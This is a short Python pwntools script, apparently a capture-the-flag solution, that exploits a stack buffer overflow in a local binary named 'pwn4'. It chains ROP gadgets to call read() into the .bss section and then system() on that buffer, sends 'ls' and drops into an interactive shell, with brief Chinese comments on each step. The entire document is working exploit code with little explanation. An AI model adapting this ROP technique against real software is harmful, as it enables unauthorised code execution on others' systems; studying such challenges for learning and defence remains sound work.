from pwn import *
pop_rdi_ret= 0x0000000000401196
pop_rdx_ret= 0x0000000000401265
pop_rsi_ret= 0x00000000004011ad
ret=        0x000000000040101a

system_plt=   0x0000000000401080
read_plt=0x0000000000401090
bss= 0x0000000000404060

offset=0x0A

payload=b'A'*offset+b's'*8

payload+=p64(pop_rdi_ret)+p64(0)  #0号文件描述符，标准输入
payload+=p64(pop_rsi_ret)+p64(bss)  #写入到.bss段
payload+=p64(pop_rdx_ret)+p64(0x50)  #写
payload+=p64(read_plt)  #调用read函数

payload+=p64(pop_rdi_ret)+p64(bss)  #.bss段地址
payload+=p64(system_plt)

sh=process('./pwn4')
sh.sendline(payload)
sh.sendline('ls')
sh.interactive()